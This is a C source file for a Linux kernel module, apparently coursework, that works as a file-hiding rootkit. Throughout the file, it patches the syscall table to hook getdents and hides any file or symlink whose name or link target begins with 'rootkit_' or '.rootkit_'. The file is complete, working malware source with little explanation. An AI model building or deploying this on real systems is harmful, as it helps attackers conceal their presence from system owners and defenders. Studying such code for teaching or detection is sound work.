#include <linux/types.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/proc_fs.h>
#include <linux/delay.h>
#include <linux/string.h>
#include <linux/module.h>
#include <linux/moduleloader.h>
#include <linux/moduleparam.h>
#include <linux/reboot.h>
#include "../sysmap.h"		// for sys_call_table address this is Device spesific
#include <linux/sched.h> 
#include <linux/init.h> 
#include <linux/kernel.h>
#include <linux/dirent.h>

#define DRIVER_AUTHOR "Moritz Dötterl <moritz.doetterl@tum.de>"
#define DRIVER_DESC   "A sample kernel module: "


// struct dev so compiler seems sattisfyed
struct linux_dirent {   
	unsigned long   d_ino;   
	unsigned long   d_off;   
	unsigned short  d_reclen;   
	char            d_name[];   
//	char			pad;
//	char			d_type;
}; 


atomic_t in_orig_syscall = ATOMIC_INIT(0);

unsigned long *sys_call_table = (unsigned long*) MAP_sys_call_table; 
asmlinkage int (*original_getdents) (unsigned int, struct linux_dirent __user *, unsigned int);
asmlinkage ssize_t (*readlinkat) (int, const char*, char*, size_t);

bool checkName(int fd, char* name, unsigned short reclen){
	char d_type = *(name + reclen - 1 - offsetof(struct linux_dirent, d_name));
	if(d_type == DT_LNK){
		char linkPath[64];
		mm_segment_t old_fs;
		memset(linkPath, 0, 64);
		old_fs = get_fs();
		set_fs(KERNEL_DS);	// make kernel accept kernel space buffer in syscall
		readlinkat(fd,name,linkPath,64);
		set_fs(old_fs);
		if(strstr(linkPath, "/rootkit_") != NULL) {
			printk("Found link to be hidden: %s links to: %s\n",name, linkPath);
			return true;
		}
		if(strstr(linkPath, "/.rootkit_") != NULL) {
			printk("Found .link to be hidden: %s links to: %s\n",name, linkPath);
			return true;
		}
	}
	else if(reclen - 2 - offsetof(struct linux_dirent, d_name) > 7){
		if(strstr(name, "rootkit_") == name){//name[0] == 'r' && name[1] == 'o' && name[2] == 'o' && name[3] == 't' && name[4] == 'k' && name[5] == 'i' && name[6] == 't' && name[7] == '_'){
			printk("Found file to be hidden: %s\n", name);
			return true;
			//printk("d_type: %d, DT_DIR: %d, lnk: %d, file: %d\n", d_type, DT_DIR, DT_LNK, DT_REG);
		}
		if(strstr(name, ".rootkit_") == name){//name[0] == 'r' && name[1] == 'o' && name[2] == 'o' && name[3] == 't' && name[4] == 'k' && name[5] == 'i' && name[6] == 't' && name[7] == '_'){
			printk("Found .file to be hidden: %s\n", name);
			return true;
		}
	}
	return false;
}

asmlinkage int hacked_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
{
	int ret;
	int len;
	int curlen;

	atomic_inc(&in_orig_syscall); 
	ret = original_getdents(fd,dirp,count);	
	len = ret;

	while(len>0)
	{
		curlen  = dirp->d_reclen;
		len = len-curlen;

		if(checkName(fd, dirp->d_name, dirp->d_reclen)){		// This is getting interesting
			memmove(dirp, (char*) dirp + dirp->d_reclen,len);
			ret -= curlen;
		}
		else {	// not an interesting entry
			if(len != 0)
			{
				dirp = (struct linux_dirent *) ((char*) dirp + dirp->d_reclen);
			}
		}

	}

	atomic_dec(&in_orig_syscall);
	return ret;
}


/* Make the page writable */
int make_rw(unsigned long address)
{
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);
	if(pte->pte &~ _PAGE_RW)
		pte->pte |= _PAGE_RW;
	return 0;
}

/* Make the page write protected */
int make_ro(unsigned long address)
{
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);
	pte->pte = pte->pte &~ _PAGE_RW;
	return 0;
}

static int __init init_mod(void)
{	
	printk("inserting...\n");

	make_rw((unsigned long)sys_call_table);
	original_getdents = (void*)*(sys_call_table + __NR_getdents);
	*(sys_call_table + __NR_getdents) = (unsigned long)hacked_getdents;
	readlinkat = (void*)*(sys_call_table + __NR_readlinkat);
	make_ro((unsigned long)sys_call_table);
	printk("Hock is running; files starting with rootkit_ should be hidden\n");

	return 0;
}

static void __exit  exit_mod(void)
{
	printk("exiting...\n");

	make_rw((unsigned long)sys_call_table);
	*(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
	make_ro((unsigned long)sys_call_table);
	if(atomic_read(&in_orig_syscall)!=0) 
		printk("waiting for instance to be finished\n");
	while(atomic_read(&in_orig_syscall)!=0){
		msleep(10);
	}
	printk("hook is not running anymore\n");
} 

module_init(init_mod);
module_exit(exit_mod);

MODULE_LICENSE("GPL"); 				/* Declare it as GPL License */
MODULE_AUTHOR(DRIVER_AUTHOR);		/* Declare the Author        */
MODULE_DESCRIPTION(DRIVER_DESC);	/* Short description         */
